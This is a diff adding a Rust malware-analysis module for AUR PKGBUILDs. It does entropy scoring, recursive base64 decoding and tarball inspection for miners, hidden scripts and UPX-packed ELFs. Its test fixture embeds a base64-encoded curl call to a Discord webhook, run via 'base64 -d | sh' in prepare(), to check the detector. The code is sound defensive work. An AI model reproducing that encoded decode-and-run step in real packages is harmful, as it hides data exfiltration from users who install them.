@@ -1,0 +1,237 @@
+//! Advanced deep code analyzer for AUR packages.
+//!
+//! Features:
+//! 1. Shannon Information Entropy analysis (detects packed blobs / shellcode).
+//! 2. Recursive payload de-obfuscation (extracts, decodes, and scans hidden base64 payloads).
+//! 3. Archive & binary inspection (inspects in-memory tarball streams, ELF headers, UPX packers).
+
+use crate::scanner::{Finding, PKGBUILDScanner};
+use base64::prelude::*;
+use regex::Regex;
+use std::collections::HashMap;
+use std::io::Read;
+
+/// Compute Shannon Entropy in bits per byte (0.0 to 8.0).
+/// Normal text/code: ~3.0 - 4.5
+/// Base64 encoded / encrypted / packed data: > 5.0
+pub fn shannon_entropy(s: &str) -> f64 {
+    if s.is_empty() {
+        return 0.0;
+    }
+    let mut counts = HashMap::new();
+    for b in s.bytes() {
+        *counts.entry(b).or_insert(0usize) += 1;
+    }
+    let len = s.len() as f64;
+    let mut entropy = 0.0;
+    for &count in counts.values() {
+        let p = count as f64 / len;
+        entropy -= p * p.log2();
+    }
+    entropy
+}
+
+/// Analyze string tokens for high Shannon entropy (packed/encrypted payloads).
+pub fn analyze_entropy(content: &str) -> Vec<Finding> {
+    let mut findings = Vec::new();
+    let token_re = Regex::new(r#"['"]([A-Za-z0-9+/=_-]{40,})['"]"#).unwrap();
+
+    for (idx, line) in content.lines().enumerate() {
+        let trimmed = line.trim();
+        if trimmed.starts_with('#')
+            || trimmed.starts_with("sha256sums")
+            || trimmed.starts_with("sha512sums")
+            || trimmed.starts_with("b2sums")
+            || trimmed.starts_with("md5sums")
+            || trimmed.starts_with("validpgpkeys")
+            || trimmed.starts_with("source")
+        {
+            continue;
+        }
+
+        for cap in token_re.captures_iter(line) {
+            let token = &cap[1];
+            // Skip pure hex checksums
+            if (token.len() == 64 || token.len() == 128)
+                && token.chars().all(|c| c.is_ascii_hexdigit())
+            {
+                continue;
+            }
+
+            let ent = shannon_entropy(token);
+            if ent > 5.2 {
+                findings.push(Finding {
+                    rule_id: "SUS_HIGH_ENTROPY_PAYLOAD".into(),
+                    severity: "HIGH".into(),
+                    description: format!(
+                        "High Shannon entropy ({:.2} bits/byte) detected in string literal - packed or encrypted payload",
+                        ent
+                    ),
+                    line_number: idx + 1,
+                    matched_text: format!(
+                        "{}... (entropy: {:.2})",
+                        &token[..token.len().min(40)],
+                        ent
+                    ),
+                });
+            }
+        }
+    }
+    findings
+}
+
+/// Recursively extract, de-obfuscate, and scan hidden Base64 payloads.
+pub fn deobfuscate_and_scan(content: &str, scanner: &PKGBUILDScanner) -> Vec<Finding> {
+    let mut findings = Vec::new();
+    let b64_pattern = Regex::new(r#"['"]([A-Za-z0-9+/]{24,}={0,2})['"]"#).unwrap();
+
+    for (idx, line) in content.lines().enumerate() {
+        let trimmed = line.trim();
+        if trimmed.starts_with('#')
+            || trimmed.starts_with("sha256sums")
+            || trimmed.starts_with("sha512sums")
+            || trimmed.starts_with("b2sums")
+            || trimmed.starts_with("md5sums")
+        {
+            continue;
+        }
+
+        for cap in b64_pattern.captures_iter(line) {
+            let candidate = &cap[1];
+            // Skip pure hex checksums
+            if candidate.chars().all(|c| c.is_ascii_hexdigit()) {
+                continue;
+            }
+
+            if let Ok(decoded_bytes) = BASE64_STANDARD.decode(candidate) {
+                if let Ok(decoded_str) = String::from_utf8(decoded_bytes) {
+                    // Recursively scan the un-obfuscated content
+                    let inner_findings = scanner.scan(&decoded_str, None);
+                    for inner in inner_findings {
+                        findings.push(Finding {
+                            rule_id: format!("DEOBFUSCATED_{}", inner.rule_id),
+                            severity: "CRITICAL".into(),
+                            description: format!(
+                                "Payload decoded from Base64 on line {}: {}",
+                                idx + 1,
+                                inner.description
+                            ),
+                            line_number: idx + 1,
+                            matched_text: format!(
+                                "Decoded: {}",
+                                inner.matched_text[..inner.matched_text.len().min(80)].trim()
+                            ),
+                        });
+                    }
+                }
+            }
+        }
+    }
+    findings
+}
+
+/// Inspect in-memory tarball streams (.tar.gz, .tgz) for suspicious files, UPX binaries, or miners.
+pub fn inspect_tar_stream(gz_bytes: &[u8]) -> Vec<Finding> {
+    let mut findings = Vec::new();
+    let mut gz = flate2::read::GzDecoder::new(gz_bytes);
+    let mut decompressed = Vec::new();
+    if gz.read_to_end(&mut decompressed).is_err() {
+        return findings;
+    }
+
+    let mut offset = 0;
+    while offset + 512 <= decompressed.len() {
+        let header = &decompressed[offset..offset + 512];
+        if header.iter().all(|&b| b == 0) {
+            break;
+        }
+        let name_bytes = &header[0..100];
+        let name_len = name_bytes.iter().position(|&b| b == 0).unwrap_or(100);
+        let path_str = String::from_utf8_lossy(&name_bytes[..name_len]).to_string();
+
+        let size_bytes = &header[124..136];
+        let size_str = String::from_utf8_lossy(size_bytes)
+            .trim_matches(|c| c == '\0' || c == ' ')
+            .to_string();
+        let file_size = usize::from_str_radix(&size_str, 8).unwrap_or(0);
+
+        offset += 512;
+        let data_end = (offset + file_size).min(decompressed.len());
+        let file_data = &decompressed[offset..data_end];
+
+        let lower = path_str.to_lowercase();
+        // 1. Check for cryptocurrency miner binaries
+        if lower.contains("xmrig") || lower.contains("minerd") || lower.contains("cpuminer") {
+            findings.push(Finding {
+                rule_id: "ARCHIVE_MINER_BINARY".into(),
+                severity: "CRITICAL".into(),
+                description: format!("Archive contains cryptocurrency miner file: {path_str}"),
+                line_number: 1,
+                matched_text: path_str.clone(),
+            });
+        }
+
+        // 2. Check for hidden executable scripts in asset folders
+        let is_hidden_script =
+            (lower.contains("assets/") || lower.contains("fonts/") || lower.contains("images/"))
+                && (lower.ends_with(".sh") || lower.ends_with(".bash") || lower.ends_with(".py"));
+        if is_hidden_script {
+            findings.push(Finding {
+                rule_id: "ARCHIVE_SUSPICIOUS_SCRIPT_LOCATION".into(),
+                severity: "HIGH".into(),
+                description: format!("Executable script hidden in asset directory: {path_str}"),
+                line_number: 1,
+                matched_text: path_str.clone(),
+            });
+        }
+
+        // 3. Inspect binary headers for UPX packing
+        if file_data.starts_with(b"\x7fELF") && file_data.windows(4).any(|w| w == b"UPX!") {
+            findings.push(Finding {
+                rule_id: "ARCHIVE_UPX_PACKED_ELF".into(),
+                severity: "HIGH".into(),
+                description: format!(
+                    "Archive contains UPX-packed ELF binary (anti-analysis evasion): {path_str}"
+                ),
+                line_number: 1,
+                matched_text: path_str.clone(),
+            });
+        }
+
+        // Move to next 512-byte block
+        offset += file_size.div_ceil(512) * 512;
+    }
+    findings
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn entropy_detects_high_entropy_blob() {
+        let plain =
+            "echo 'hello world this is a normal shell script line with standard english words'";
+        assert!(shannon_entropy(plain) < 4.5);
+
+        // Random high-entropy base64 blob
+        let packed = "q83vB+xZ7LmK9pY2rNtU0wF6jC4hG1sE5aD3iO8uP7yX9zW0vT2rQ4mN6kL8jH1gF3eS5aD==";
+        assert!(shannon_entropy(packed) > 5.0);
+    }
+
+    #[test]
+    fn deobfuscator_detects_hidden_discord_webhook() {
+        let scanner = PKGBUILDScanner::new();
+        // Base64 of: curl https://discord.com/api/webhooks/123/xyz
+        let b64 = "Y3VybCBodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMjMveHl6";
+        let script = format!("prepare() {{\n  echo \"{b64}\" | base64 -d | sh\n}}\n");
+
+        let findings = deobfuscate_and_scan(&script, &scanner);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == "DEOBFUSCATED_EXFIL_DISCORD_WEBHOOK"),
+            "Expected de-obfuscation to unmask the hidden Discord webhook, got: {findings:?}"
+        );
+    }
+}
